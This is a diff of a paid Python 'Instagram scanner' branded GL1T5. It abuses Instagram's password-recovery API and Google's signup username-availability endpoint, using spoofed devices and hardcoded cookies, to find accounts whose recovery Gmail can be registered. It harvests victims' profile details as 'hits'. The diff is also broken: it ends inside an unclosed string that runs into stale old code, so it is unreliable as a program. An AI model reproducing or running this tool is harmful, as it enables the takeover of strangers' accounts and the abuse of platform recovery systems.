@@ -5,35 +5,479 @@ import uuid
 import base64
 import random
 import hashlib
-import inspect
 import re
-import webbrowser
-from datetime import datetime
-from threading import Thread
-from random import choice as cc, randrange as rr
+import sys
 import requests
 import pytz
-from cfonts import render
-from user_agent import generate_user_agent as ggb
-from requests import post as pp, get
-import sys
+from datetime import datetime
+from threading import Thread, Lock
+from random import choice, randrange
+from user_agent import generate_user_agent
 
-# Initialize color scheme
+# ==================== INITIAL SETUP ====================
+os.system('cls' if os.name == 'nt' else 'clear')
+
+# Color definitions
 class Colors:
-    RED = '\033[1;31m'
-    GREEN = '\033[1;32m'
-    YELLOW = '\033[1;33m'
-    BLUE = '\033[1;34m'
-    MAGENTA = '\033[1;35m'
-    CYAN = '\033[1;36m'
-    WHITE = '\033[1;37m'
-    GRAY = '\033[1;90m'
+    RESET = '\033[0m'
     BOLD = '\033[1m'
-    END = '\033[0m'
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    GRAY = '\033[90m'
 
-# Banner and initialization
+# Professional banner with enhanced design
 def display_banner():
+    print(f"""{Colors.CYAN}
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                              ║
+║  ██████╗ ██╗     ██╗████████╗███████╗██╗  ██╗      ███████╗ ██████╗██████╗  ║
+║ ██╔════╝ ██║     ██║╚══██╔══╝██╔════╝██║  ██║      ██╔════╝██╔════╝██╔══██╗ ║
+║ ██║  ███╗██║     ██║   ██║   ███████╗███████║█████╗███████╗██║     ██████╔╝ ║
+║ ██║   ██║██║     ██║   ██║   ╚════██║██╔══██║╚════╝╚════██║██║     ██╔══██╗ ║
+║ ╚██████╔╝███████╗██║   ██║   ███████║██║  ██║      ███████║╚██████╗██║  ██║ ║
+║  ╚═════╝ ╚══════╝╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝      ╚══════╝ ╚═════╝╚═╝  ╚═╝ ║
+║                                                                              ║
+║                     𝐏𝐑𝐎𝐅𝐄𝐒𝐒𝐈𝐎𝐍𝐀𝐋 𝗣𝗔𝗜𝗗 𝗙𝗜𝗟𝗘 𝗕𝗬 𝗚𝗟𝗜𝗧𝗖𝗛                      ║
+║                     Telegram: @GL1T5 | Join @Glitch_army                     ║
+║                                 Version 5.0                                  ║
+╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
+""")
+    time.sleep(1.5)
+
+display_banner()
+
+# ==================== GLOBAL VARIABLES ====================
+total, hits, bad_gm, bad_mail, goodig = 0, 0, 0, 0, 0
+infoinsta = {}
+stats_lock = Lock()
+REMOTE_URL = "https://raw.githubusercontent.com/LEVIXX797/1/main/Acess.txt"
+
+# ==================== ACCESS VERIFICATION ====================
+def progress_bar(task="Processing", duration=2):
+    """Enhanced progress bar with better visuals"""
+    for i in range(21):
+        percent = int((i/20) * 100)
+        bar = "█" * i + "░" * (20 - i)
+        sys.stdout.write(f"\r{Colors.CYAN}{task}: |{bar}| {percent}%{Colors.RESET}")
+        sys.stdout.flush()
+        time.sleep(duration / 20)
+    print()
+
+def fetch_id_data():
+    try:
+        progress_bar("📡 Fetching Access Data", 2)
+        response = requests.get(REMOTE_URL, timeout=10)
+        response.raise_for_status()
+        return [line.strip() for line in response.text.strip().splitlines() if "|" in line]
+    except Exception as e:
+        print(f"{Colors.RED}\n[❌] Error fetching data: {e}{Colors.RESET}")
+        return []
+
+def check_id_validity(input_id):
+    input_id = input_id.strip()
+    data = fetch_id_data()
+
+    progress_bar("🔐 Verifying User ID", 2)
+
+    for record in data:
+        try:
+            id_val, expiry = map(str.strip, record.split("|"))
+            if id_val == input_id:
+                expiry_dt = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
+                if datetime.now() < expiry_dt:
+                    remaining_time = expiry_dt - datetime.now()
+                    hrs, rem = divmod(remaining_time.seconds, 3600)
+                    mins, secs = divmod(rem, 60)
+                    
+                    print(f"{Colors.GREEN}\n╔══════════════════════════════════════════════════╗")
+                    print(f"║                  🎉 ACCESS GRANTED 🎉                 ║")
+                    print(f"╠══════════════════════════════════════════════════╣")
+                    print(f"║ • Valid ID: {id_val}{' '*(38-len(id_val))}║")
+                    print(f"║ • Expires in: {hrs}h {mins}m {secs}s{' '*(26-len(f'{hrs}h {mins}m {secs}s'))}║")
+                    print(f"║ • Expiry: {expiry_dt}{' '*(36-len(str(expiry_dt)))}║")
+                    print(f"╚══════════════════════════════════════════════════╝{Colors.RESET}")
+                    
+                    time.sleep(2)
+                    return True
+                else:
+                    print(f"{Colors.RED}\n[⛔] This ID has expired. Renew your subscription via @GL1T5{Colors.RESET}")
+                    return False
+        except:
+            continue
+
+    print(f"{Colors.RED}\n[⚠️] You are not a paid user. Buy a subscription ~ @GL1T5 (TG){Colors.RESET}")
+    return False
+
+# Get user ID and verify access
+print(f"{Colors.CYAN}\n┌──────────────────────────────────────────────────┐")
+print(f"│               🔐 ACCOUNT VERIFICATION 🔐          │")
+print(f"└──────────────────────────────────────────────────┘{Colors.RESET}")
+USER_ID = input(f"{Colors.WHITE}📋 𝗨𝗦𝗘𝗥_𝗜𝗗: {Colors.RESET}")
+
+if not check_id_validity(USER_ID):
+    exit()
+
+print(f"{Colors.GREEN}\n[🚀] Access verified. Welcome!{Colors.RESET}")
+time.sleep(2)
+os.system('cls' if os.name == 'nt' else 'clear')
+
+# ==================== TOKEN INPUT ====================
+print(f"{Colors.CYAN}┌──────────────────────────────────────────────────┐")
+print(f"│                 🔑 TOKEN CONFIGURATION 🔑         │")
+print(f"└──────────────────────────────────────────────────┘{Colors.RESET}")
+TOKEN = input(f"{Colors.WHITE}🔐 Token : {Colors.RESET}")
+
+# ==================== TL TOKEN GENERATION ====================
+def tll():
+    try:
+        yy = 'azertyuiopmlkjhgfdsqwxcvbn'
+        n1 = ''.join(choice(yy) for i in range(randrange(6, 9)))
+        n2 = ''.join(choice(yy) for i in range(randrange(3, 9)))
+        host = ''.join(choice(yy) for i in range(randrange(15, 30)))
+        
+        he3 = {
+            'accept': '*/*',
+            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'google-accounts-xsrf': '1',
+            'user-agent': generate_user_agent()
+        }
+        
+        res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
+        tok_match = re.search('data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text)
+        
+        if not tok_match:
+            raise Exception("Token not found")
+            
+        tok = tok_match.group(2)
+        cookies = {'__Host-GAPS': host}
+        
+        headers = {
+            'authority': 'accounts.google.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'google-accounts-xsrf': '1',
+            'origin': 'https://accounts.google.com',
+            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
+            'user-agent': generate_user_agent()
+        }
+        
+        data = {
+            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
+            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
+        }
+        
+        response = requests.post('https://accounts.google.com/_/signup/validatepersonaldetails', cookies=cookies, headers=headers, data=data)
+        tl = str(response.text).split('",null,"')[1].split('"')[0]
+        host = response.cookies.get_dict()['__Host-GAPS']
+        
+        with open('tl.txt', 'w') as f:
+            f.write(f"{tl}//{host}\n")
+            
+    except Exception as e:
+        print(f"{Colors.RED}Error generating TL token: {e}{Colors.RESET}")
+        time.sleep(2)
+        tll()
+
+# Generate TL token
+print(f"{Colors.CYAN}\n[🔄] Generating TL token for Gmail verification...{Colors.RESET}")
+tll()
+print(f"{Colors.GREEN}[✅] TL token generated successfully!{Colors.RESET}")
+
+# ==================== MAIN FUNCTIONS ====================
+def display_stats():
     os.system('cls' if os.name == 'nt' else 'clear')
+    global hits, bad_gm, bad_mail, total
+    
+    # Get current values with thread safety
+    with stats_lock:
+        current_hits = hits
+        current_bad_gm = bad_gm
+        current_bad_mail = bad_mail
+        current_total = total
+    
+    # Format the stats display
+    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════╗")
+    print(f"║                  📊 SCANNING STATUS 📊            ║")
+    print(f"╠══════════════════════════════════════════════════╣")
+    print(f"║ • ✅ Hits: {current_hits}{' '*(37-len(str(current_hits)))}║")
+    print(f"║ • ❌ Bad: {current_bad_gm}{' '*(38-len(str(current_bad_gm)))}║")
+    print(f"║ • 📧 Bad Email: {current_bad_mail}{' '*(31-len(str(current_bad_mail)))}║")
+    print(f"║ • 📈 Total: {current_total}{' '*(36-len(str(current_total)))}║")
+    print(f"╚══════════════════════════════════════════════════╝{Colors.RESET}")
+    print(f"{Colors.MAGENTA}           ♡ TOOL BY 𝗚𝗟1𝗧5 ♡ {Colors.RESET}".center(54))
+
+def check_gmail(email):
+    global bad_mail, hits
+    try:
+        if '@' in email:
+            email = str(email).split('@')[0]
+            
+        try:
+            with open('tl.txt', 'r') as f:
+                o = f.read().splitlines()[0]
+        except:
+            o = open('tl.txt', 'r').read().splitlines()[0]
+            
+        tl, host = o.split('//')
+        cookies = {'__Host-GAPS': host}
+        
+        headers = {
+            'authority': 'accounts.google.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'google-accounts-xsrf': '1',
+            'origin': 'https://accounts.google.com',
+            'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
+            'user-agent': generate_user_agent()
+        }
+        
+        params = {'TL': tl}
+        data = f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&"
+        
+        response = requests.post('https://accounts.google.com/_/signup/usernameavailability', 
+                               params=params, cookies=cookies, headers=headers, data=data)
+        
+        if '"gf.uar",1' in str(response.text):
+            with stats_lock:
+                hits += 1
+            if '@' not in email:
+                InfoAcc(email, 'gmail.com')
+            else:
+                username, gg = email.split('@')
+                InfoAcc(username, gg)
+        else:
+            with stats_lock:
+                bad_mail += 1
+                
+    except Exception as e:
+        with stats_lock:
+            bad_mail += 1
+
+def check_instagram_account(email):
+    global goodig, bad_gm
+    try:
+        ua = generate_user_agent()
+        dev = 'android-'
+        device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
+        uui = str(uuid.uuid4())
+        
+        headers = {
+            'User-Agent': ua,
+            'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
+        }
+        
+        data = {
+            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + 
+                          json.dumps({
+                              '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+                              'adid': uui,
+                              'guid': uui,
+                              'device_id': device_id,
+                              'query': email
+                          }),
+            'ig_sig_key_version': '4'
+        }
+        
+        response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', 
+                               headers=headers, data=data)
+        
+        if email in response.text:
+            if '@gmail.com' in email:
+                check_gmail(email)
+            with stats_lock:
+                goodig += 1
+            return True
+        else:
+            with stats_lock:
+                bad_gm += 1
+            return False
+            
+    except Exception as e:
+        with stats_lock:
+            bad_gm += 1
+        return False
+
+def get_reset_email(user):
+    try:
+        headers = {
+            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+            'X-Pigeon-Rawclienttime': '1700251574.982',
+            'X-IG-Connection-Speed': '-1kbps',
+            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+            'X-IG-Bandwidth-TotalBytes-B': '0',
+            'X-IG-Bandwidth-TotalTime-MS': '0',
+            'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
+            'X-IG-Connection-Type': 'WIFI',
+            'X-IG-Capabilities': '3brTvw==',
+            'X-IG-App-ID': '567067343352427',
+            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+            'Accept-Language': 'en-GB, en-US',
+            'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Accept-Encoding': 'gzip, deflate',
+            'Host': 'i.instagram.com',
+            'X-FB-HTTP-Engine': 'Liger',
+            'Connection': 'keep-alive',
+            'Content-Length': '356'
+        }
+        
+        data = {
+            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + 
+                          json.dumps({
+                              '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+                              'adid': '0dfaf820-2748-4634-9365-c3d8c8011256',
+                              'guid': '1f784431-2663-4db9-b624-86bd9ce1d084',
+                              'device_id': 'android-b93ddb37e983481c',
+                              'query': user
+                          }),
+            'ig_sig_key_version': '4'
+        }
+        
+        response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', 
+                               headers=headers, data=data)
+        return response.json().get('email', 'bad')
+        
+    except Exception as e:
+        return 'bad'
+
+def date(user_id):
+    try:
+        uid = int(user_id)
+        if 1 < uid < 1279000:
+            return 2010
+        elif 1279001 <= uid < 17750000:
+            return 2011
+        elif 17750001 <= uid < 279760000:
+            return 2012
+        elif 279760001 <= uid < 900990000:
+            return 2013
+        elif 900990001 <= uid < 1629010000:
+            return 2014
+        elif 1900000000 <= uid < 2500000000:
+            return 2015
+        elif 2500000000 <= uid < 3713668786:
+            return 2016
+        elif 3713668786 <= uid < 5699785217:
+            return 2017
+        elif 5699785217 <= uid < 8507940634:
+            return 2018
+        elif 8507940634 <= uid < 21254029834:
+            return 2019
+        else:
+            return '2020-2023'
+    except Exception:
+        return 'Unknown'
+
+def get_user_info_from_api(user_id):
+    try:
+        model_number = str(random.randint(150, 999))
+        android_version = random.choice(['23/6.0', '24/7.0', '25/7.1.1', '26/8.0', '27/8.1', '28/9.0'])
+        dpi = str(random.randint(100, 1300))
+        resolution = f"{random.randint(200, 2000)}x{random.randint(200, 2000)}"
+        brand = random.choice(['SAMSUNG', 'HUAWEI', 'LGE/lge', 'HTC', 'ASUS', 'ZTE', 'ONEPLUS', 'XIAOMI', 'OPPO', 'VIVO', 'SONY', 'REALME'])
+        build_suffix = str(random.randint(111, 999))
+        
+        user_agent = f"Instagram 311.0.0.32.118 Android ({android_version}; {dpi}dpi; {resolution}; {brand}; SM-T{model_number}; SM-T{model_number}; qcom; en_US; 545986{build_suffix})"
+        lsd_token = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))
+        
+        headers = {
+            'accept': '*/*',
+            'accept-language': 'en,en-US;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dnt': '1',
+            'origin': 'https://www.instagram.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.instagram.com/cristiano/following/',
+            'user-agent': user_agent,
+            'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
+            'x-fb-lsd': lsd_token
+        }
+        
+        data = {
+            'lsd': lsd_token,
+            'fb_api_caller_class': 'RelayModern',
+            'fb_api_req-friendly_name': 'PolarisUserHoverCardContentV2Query',
+            'variables': json.dumps({'userID': user_id, 'username': 'cristiano'}),
+            'server_timestamps': 'true',
+            'doc_id': '7717269488336001'
+        }
+        
+        response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
+        return response.json().get('data', {}).get('user', {})
+        
+    except Exception as e:
+        return {}
+
+def InfoAcc(username, domain):
+    global total
+    try:
+        # Get user info from our stored data or API
+        rr = infoinsta.get(username, {})
+        if not rr:
+            # If not in stored data, try to get from API
+            rr = get_user_info_from_api(username)
+            if rr:
+                infoinsta[username] = rr
+        
+        user_id = rr.get('pk', '')
+        full_name = rr.get('full_name', 'N/A')
+        followers = rr.get('follower_count', 0)
+        following = rr.get('following_count', 0)
+        posts = rr.get('media_count', 0)
+        is_private = rr.get('is_private', False)
+        bio = rr.get('biography', 'N/A')
+        is_verified = rr.get('is_verified', False)
+        is_business = rr.get('is_business', False)
+        
+        # Check meta status
+        try:
+            if followers and posts:
+                meta = int(followers) >= 10 and int(posts) >= 2
+            else:
+                meta = False
+        except:
+            meta = False
+        
+        with stats_lock:
+            total += 1
+            
+        reset_email = get_reset_email(username)
+        if reset_email.endswith('@gmail.com'):
+            email = f"{username}@gmail.com"
+        elif reset_email.endswith('@a**.com') or reset_email.endswith('@aol.com'):
+            email = f"{username}@aol.com"
+        else:
+            email = f"{username}"
+            
+        creation_year = date(user_id)
+        
+        # Format the account info
+        account_info = f"""
+🔐【ＰＲＯＦＥＳＳＩＯＮＡＬ ＩＮＳＴＡＧＲＡＭ ＳＣＡＮＮＥＲ】🔐
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 𝗡𝗔𝗠𝗘        :: {full_name}
+📛 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘     :: @{username}
+📧 𝗘𝗠𝗔𝗜𝗟        :: {email}
+👥 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦    :: {followers:,}
+📈 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚     :: {following:,}
+📸 𝗣𝗢𝗦𝗧𝗦        :: {posts:,}
+📝 𝗕𝗜𝗢         :: {bio[:50] + '...' if bio and len(bio) > 50 else bio}
+🔒 𝗣𝗥𝗜𝗩𝗔𝗧𝗘      :: {'Yes' if is_private else 'No'}
+✅ 𝗩𝗘𝗥𝗜𝗥𝗜𝗘𝗗      :: {'Yes' if is_verified else 'No'}
+🏢 𝗕𝗨𝗦𝗜𝗡𝗘𝗦𝗦      :: {'Yes' if is_business else 'No'}
+🆔 𝗜𝗗          :: {user_id}
+📅 𝗬𝗘𝗔𝗥        :: {creation_year}
+🏆 𝗠𝗘𝗧𝗔 𝗦𝗧𝗔𝗧𝗨𝗦   :: {'Qualified' if meta else 'Not Qualified'}
+🌐 𝗣𝗥𝗢𝗙𝗜𝗟𝗘      :: https://www.instagram.com/{username}
     COLOR_COMBOS = [['green','yellow'],['magenta','red'],['blue','cyan'],['white','gray'],['red','magenta'],['yellow','green']]
     stein_colors, qe_colors = random.sample(COLOR_COMBOS, 2)
     GL1T5 = render('GL1T5', colors=stein_colors, align='center', font='block', background='black')
